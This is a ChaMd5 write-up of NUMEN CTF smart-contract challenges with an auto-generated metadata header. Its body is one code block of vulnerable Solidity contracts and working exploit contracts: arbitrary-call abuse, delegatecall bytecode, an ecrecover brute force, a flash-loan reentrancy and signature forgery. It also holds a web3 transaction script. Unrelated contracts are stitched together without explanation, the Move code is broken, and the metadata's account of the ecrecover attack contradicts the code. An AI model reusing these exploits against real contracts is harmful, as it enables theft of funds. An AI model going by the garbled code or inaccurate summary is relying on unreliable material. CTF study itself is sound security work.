---
title: NUMEN CTF writeup by ChaMd5 (Solidity 智能合约)
contest: NUMEN CTF
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- Solidity 0.7.0/0.8.13
- delegatecall
- abi.encodeWithSignature
- ERC20
- ecrecover
- ExistingStock
attack_chain: '|'
key_payload: '|'
one_liner: 'NUMEN CTF ChaMd5: Solidity 智能合约多道 (ExistingStock 任意 transferFrom/approve + SmartCounter delegatecall + PrivilegeFinance ecrecover)。'
lesson: '|'
quality: high
full_path: NUMEN_CTF_writeup_by_ChaMd5.full.md
meta_path: NUMEN_CTF_writeup_by_ChaMd5.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'NUMEN CTF writeup by ChaMd5 (Solidity 智能合约)。NUMEN CTF ChaMd5: Solidity 智能合约多道 (ExistingStock 任意 transferFrom/approve + SmartCounter delegatecall + PrivilegeFinance ecrecover)。。经验：|'
category: web
subcategory: web_other
tools_used:
- Solidity
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/107038.html
wp_author: ChaMd5
reasoning_chain:
- ExistingStock 触发点：Solidity 0.7.0 + privilegedborrowing(value, secure, target, data) 任意调用 → 假设：调 transfer + approve + setflag
- 假设：setflag() 要求 balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000 → 动作：先 transfer 200001 再 approve 200001
- 动作：EXP 合约 hack()：target.privilegedborrowing(0, address(0), address(target), abi.encodeWithSignature('transfer(address,uint256)', address(this), 200001)) + approve + setflag
- SmartCounter 触发点：Solidity 0.8.13 + create(code) + A_delegateccall(data) → 假设：code.length <= 24 部署子合约 + delegatecall 任意代码执行
- 动作：create(8 字节 shellcode) + A_delegateccall(data) → 假设：delegatecall 走 shellcode
- PrivilegeFinance 触发点：ecrecover 签名验证 → _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp)) → 假设：知道 admin 私钥 v=28
- 动作：签名任意 _blocktimestamp → DynamicRew(_msgsender, _blocktimestamp, _ReferrerFees, _transferRate) 设置 referrer/transferRate
- 假设：transfer 在 msg.sender == admin 时给 recipient amount * amount * transferRate → 假设：整数溢出 + 巨额转账
failed_attempts:
- ExistingStock 试图直接调 setflag → 失败：balanceOf 和 allowance 必须先满足条件
- SmartCounter 试图用 > 24 字节合约 → 失败：create 限制 code.length <= 24
- PrivilegeFinance 试图不知道 admin 私钥爆破 ecrecover → 失败：必须知道 admin 私钥 v=28
key_observations:
- ExistingStock privilegedborrowing + abi.encodeWithSignature = 任意调用任意函数（Solidity 0.7 漏洞）
- Solidity 0.8.13 delegatecall + code.length <= 24 限制 = 短 shellcode 部署 + delegatecall 执行
- ecrecover 签名验证 + 已知 admin 私钥 v=28 = 任意 _blocktimestamp 签名伪造
- 整数溢出 amount * amount * transferRate 在 Solidity 0.8+ 自动 check 阻断，必须 0.7 合约
- NUMEN CTF 是智能合约专项赛，ChaMd5 战队专攻 Solidity 攻击
prerequisites:
- Solidity 智能合约（delegatecall / abi.encodeWithSignature / ecrecover）
- Remix + Brownie/Hardhat 开发部署
- ERC20 transfer/approve/allowance 模型
- ecrecover 签名验证 + 私钥恢复
---
# NUMEN CTF writeup by ChaMd5

> 原文: https://www.ctfiot.com/107038.html
> ID: 107038

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
pragma solidity ^0.7.0;

contract ExistingStock {

address public owner;
address private reserve;

string public name = "Existing Stock";
string public symbol = "ES";
uint256 public decimals = 18;
uint256 public totalSupply = 200000000000;
uint8 public frequency = 1;

bool public Lock = false;
bool public result;
bool public flag;

event Approval(address indexed from, address indexed to, uint number);
event Transfer(address indexed from, address indexed to, uint number);
event Deposit(address indexed to, uint number);
event Withdraw(address indexed from, uint number);
event Target(address indexed from, bool result);

mapping (address => uint) public balanceOf;
mapping (address => mapping (address => uint)) public allowance;

constructor() public {
owner = msg.sender;
balanceOf[owner] = totalSupply;
}

function approve(address to, uint number) public returns (bool) {
allowance[msg.sender][to] = number;
emit Approval(msg.sender, to, number);
return true;
}

function transfer(address _to, uint _value) public returns (bool) {
require(balanceOf[msg.sender] - _value >= 0);
balanceOf[msg.sender] -= _value;
balanceOf[_to] += _value;
return true;
}

function transferFrom(address from, address to, uint number) public returns (bool){

require(balanceOf[from] >= number);

if (from != msg.sender && allowance[from][msg.sender] != uint256(-1)) {
require(allowance[from][msg.sender] >= number);
allowance[from][msg.sender] -= number;
}

balanceOf[from] -= number;
balanceOf[to] += number;

emit Transfer(from, to, number);
return true;
}

function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) public {
require(Lock == false && value >= 0 && value <= 1000);
balanceOf[address(this)] -= value;
balanceOf[target] += value;

address(target).call(data);

Lock = true;

require(balanceOf[target] >= value);
balanceOf[address(this)] += value;
balanceOf[target] -= value;

Lock = false;
}

function withdraw(uint number) public {
require(balanceOf[msg.sender] >= number);
balanceOf[msg.sender] -= number;
(msg.sender).transfer(number);
emit Withdraw(msg.sender, number);
}

function setflag() public {
if(balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000){
flag = true;
}
}

function isSolved() public view returns(bool){
return flag;
}
}
balanceOf[msg.sender] > 200000 && allowance[address(this)][msg.sender] > 200000)
pragma solidity ^0.7.0;

interface ExistingStock{
    function privilegedborrowing(uint256 value,address secure,address target,bytes memory data) external ;
    function setflag() external ;
}

contract EXP{
    ExistingStock target;
    constructor(address _addr){
        target = ExistingStock(_addr);
    }

    function hack() public {
        target.privilegedborrowing(0, address(0), address(target), abi.encodeWithSignature("transfer(address,uint256)", address(this), 200001));
        target.privilegedborrowing(0, address(0), address(target), abi.encodeWithSignature("approve(address,uint256)", address(this), 200001));
        target.setflag();
    }
    
}
pragma solidity ^0.8.13;

contract Deployer {
    constructor(bytes memory code) { assembly { return (add(code, 0x20), mload(code)) } }
}
contract SmartCounter{
    address public owner;
    address public target;
    bool flag=false;
    constructor(address owner_){
        owner=owner_;
    }
    function create(bytes memory code) public{
        require(code.length<=24);
        target=address(new Deployer(code));
    }

    function A_delegateccall(bytes memory data) public{
        (bool success,bytes memory returnData)=target.delegatecall(data);
        require(owner==msg.sender);
        flag=true;
    }
    function isSolved() public view returns(bool){
        return flag;
    }
}
CALLER
PUSH1 0x00
SSTORE
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract PrivilegeFinance {

string public name = "Privilege Finance";
string public symbol = "PF";
uint256 public decimals = 18;
uint256 public totalSupply = 200000000000;
mapping(address => uint) public balances;
mapping(address => address) public referrers;
string msgsender = '0x71fA690CcCDC285E3Cb6d5291EA935cfdfE4E0';
uint public rewmax = 65000000000000000000000;
uint public time = 1677729607;
uint public Timeinterval = 600;
uint public Timewithdraw = 6000;
uint public Timeintervallimit = block.timestamp;
uint public Timewithdrawlimit = block.timestamp;
bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
uint8 v = 28;
address public admin = 0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b;
uint public burnFees = 2;
uint public ReferrerFees = 8;
uint public transferRate = 10;
address public BurnAddr = 0x000000000000000000000000000000000000dEaD;
bool public flag;

constructor() public {
balances[address(this)] = totalSupply;
}

function Airdrop() public {
require(balances[msg.sender] == 0 && block.timestamp >= Timeintervallimit,"Collection time not reached");
balances[msg.sender] += 1000;
balances[address(this)] -= 1000;
Timeintervallimit += Timeinterval;
}

function deposit(address token, uint256 amount, address _ReferrerAddress) public {
require(amount > 0, "amount zero!");
if (msg.sender != address(0) && _ReferrerAddress != address(0) && msg.sender != _ReferrerAddress && referrers[msg.sender] == address(0)) {
referrers[msg.sender] = _ReferrerAddress;
}
balances[msg.sender] -= amount;
balances[address(this)] += amount;
}

function withdraw(address token, uint256 amount) public {
require(balances[msg.sender] == 0 && block.timestamp >= Timewithdrawlimit,"Collection time not reached");
require(amount > 0 && amount <= 2000,"Financial restrictions");
Timewithdrawlimit += Timewithdraw;
require(amount > 0, "amount zero!");
balances[msg.sender] += amount;
balances[address(this)] -= amount;
}

function DynamicRew(address _msgsender,uint _blocktimestamp,uint _ReferrerFees,uint _transferRate) public returns(address) {
require(_blocktimestamp < 1677729610, "Time mismatch");
require(_transferRate <= 50 && _transferRate <= 50);
bytes32 _hash = keccak256(abi.encodePacked(_msgsender, rewmax, _blocktimestamp));
address a = ecrecover(_hash, v, r, s);
require(a == admin && time < _blocktimestamp, "time or banker");
ReferrerFees = _ReferrerFees;
transferRate = _transferRate;
return a;
}

function transfer(address recipient,uint256 amount) public {
if(msg.sender == admin){
uint256 _fee = amount * transferRate / 100;
_transfer(msg.sender, referrers[msg.sender], _fee * ReferrerFees / transferRate);
_transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
_transfer(address(this), recipient, amount * amount * transferRate);
amount = amount - _fee;

}else if(recipient == admin){
uint256 _fee = amount * transferRate / 100;
_transfer(address(this), referrers[msg.sender], _fee * ReferrerFees / transferRate);
_transfer(msg.sender, BurnAddr, _fee * burnFees / transferRate);
amount = amount - _fee;
}
_transfer(msg.sender, recipient, amount);
}

function _transfer(address from, address _to, uint _value) internal returns (bool) {
balances[from] -= _value;
balances[_to] += _value;
return true;
}

function setflag() public {
if(balances[msg.sender] > 10000000){
flag = true;
}
}

function isSolved() public view returns(bool){
return flag;
}

}
pragma solidity ^0.8.4;

contract TEST {

    uint public rewmax = 65000000000000000000000;
   
    bytes32 r = 0xf296e6b417ce70a933383191bea6018cb24fa79d22f7fb3364ee4f54010a472c;
    bytes32 s = 0x62bdb7aed9e2f82b2822ab41eb03e86a9536fcccff5ef6c1fbf1f6415bd872f9;
    uint8 v = 28;

    address public result;
    mapping(uint=>address) public addresses;

    function sign(uint _blocktimestamp) public returns(bytes32){
        uint count = 0;
        for (uint i = 0x0071fA690CcCDC285E3Cb6d5291EA935cfdfE4E000; i<=0x0071fA690CcCDC285E3Cb6d5291EA935cfdfE4E0ff; i++){
            address x = address(uint160(uint256(i)));
            addresses[count] = x;
            bytes32 _hash = keccak256(abi.encodePacked(x, rewmax, _blocktimestamp));
            address a = ecrecover(_hash, v, r, s);
            count = count + 1;
            if(a==0x2922F8CE662ffbD46e8AE872C1F285cd4a23765b){
                result = address(uint160(uint256(i)));
            }
        }            

    }
}
contract LenderPool is ReentrancyGuard {
    using Address for address;
    IERC20 public immutable token0;
    IERC20 public immutable token1;

    constructor() {
        token0 = new ERC20();
        token1 = new ERC20();
    }

    function swap(address tokenAddress,uint amount) public returns(uint){
        require(
            tokenAddress == address(token0)
        
            && token1.transferFrom(msg.sender,address(this),amount) 
            
            && token0.transfer(msg.sender,amount)

            || tokenAddress== address(token1)
            
            && token0.transferFrom(msg.sender,address(this),amount) 
            
            && token1.transfer(msg.sender,amount));
        return amount;

    } 

    function flashLoan(uint256 borrowAmount, address borrower)
        external
        nonReentrant
    {
        uint256 balanceBefore = token0.balanceOf(address(this));
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");

        token0.transfer(borrower, borrowAmount);
        borrower.functionCall(abi.encodeWithSignature("receiveEther(uint256)", borrowAmount));

        uint256 balanceAfter = token0.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
    }

}
pragma solidity 0.8.16;

interface  LenderPool{
     function flashLoan(uint256 borrowAmount, address borrower)external;
     function swap(address tokenAddress,uint amount) external;
     function token0() external returns(address);
     function token1() external returns(address);
}

interface erc20{
    function approve(address spender, uint256 amount) external returns (bool);
}

contract EXP{
    LenderPool victim;
    constructor(address _addr) public {
        victim = LenderPool(_addr);
        erc20(victim.token0()).approve(_addr,100000000000000000000);
        erc20(victim.token1()).approve(_addr,100000000000000000000);
    }

    function hack() public{
        victim.flashLoan(100000000000000000000, address(this));
        victim.swap(victim.token0(), 100000000000000000000);
    }

    function receiveEther(uint256) public{
        victim.swap(victim.token1(), 100000000000000000000);
    }
}
module checkin::
checkin {
    use sui::
object::{Self, UID};
    use sui::
transfer;
    use sui::
tx_context::{Self, TxContext};
    use sui::
event;

    struct Flag has copy, drop {
        user: address,
        flag: bool
    }

    fun init(ctx: &mut TxContext) {
    }

    public entry fun HelloHackers(buffer: vector,ctx: &mut TxContext) {
        let h=buffer;
        let value=b"hello";
        if(h == value){
            event::
emit(Flag {
                user: tx_context::
sender(ctx),
                flag: true
            });
        }
    }
}
from web3 import Web3
from web3.middleware import geth_poa_middleware

w3 = Web3(Web3.HTTPProvider("http://8.218.239.44:
8545"))
w3.middleware_onion.inject(geth_poa_middleware, layer=0)
# 题目合约地址
target = "0xf416D27823287FF4ae38C9A4678Ca7622E27A62E"

private_key = 'xxxxxxxxxx'
acct = w3.eth.account.from_key(private_key)

tmp = w3.eth.get_block_number()
blockhash = w3.eth.get_block(tmp-10+2)['hash']
blockhash = w3.to_int(blockhash)
gasprice = (blockhash)&0xffffff

signed_txn = w3.eth.account.sign_transaction(dict(
    nonce=w3.eth.get_transaction_count(acct.address),
    gasPrice = gasprice,
    gas=5555555,
    to=target,
    value=0,
    data=bytes.fromhex('00000000'),
    chainId=0x4b1a
),
private_key,
)

tx_hash = w3.eth.send_raw_transaction(signed_txn.rawTransaction)
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(tx_hash)
print(tx_receipt)
contract Exploit{
    SignedByowner[] public sbarray;
    Wallet public wl;
    address public target;

    constructor(address _t) public{
        target= _t;
        wl = Wallet(target);
    }
    function setup() public returns(bytes memory){
        Holder memory holder1 = Holder(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, 'a', true, bytes("aaa"));
        Holder memory holder2 = Holder(0xAb8483F64d9C6d1EcF9b849Ae677dD3315835cb2, 'b', true, bytes("aaa"));
        Holder memory holder3 = Holder(0x4B20993Bc481177ec7E8f571ceCaE8A9e22C02db, 'c', true, bytes("aaa"));

        bytes32[2] memory rs1 = [bytes32(0), bytes32(0)];
        Signature memory sig1 = Signature(uint8(26), rs1);
        bytes32[2] memory rs2 = [bytes32(0), bytes32(0)];
        Signature memory sig2 = Signature(uint8(26), rs2);
        
        bytes32[2] memory rs3 = [bytes32(0), bytes32(0)];
        Signature memory sig3 = Signature(uint8(26), rs3);

        SignedByowner memory tmpsb1 = SignedByowner(holder1,sig1);
        SignedByowner memory tmpsb2 = SignedByowner(holder2,sig2);
        SignedByowner memory tmpsb3 = SignedByowner(holder3,sig3);

        sbarray.push(tmpsb1);
        sbarray.push(tmpsb2);
        sbarray.push(tmpsb3);

    }

    function exp() public{
        wl.transferWithSign(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4, 100000000000000000000, sbarray);
    }
}
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]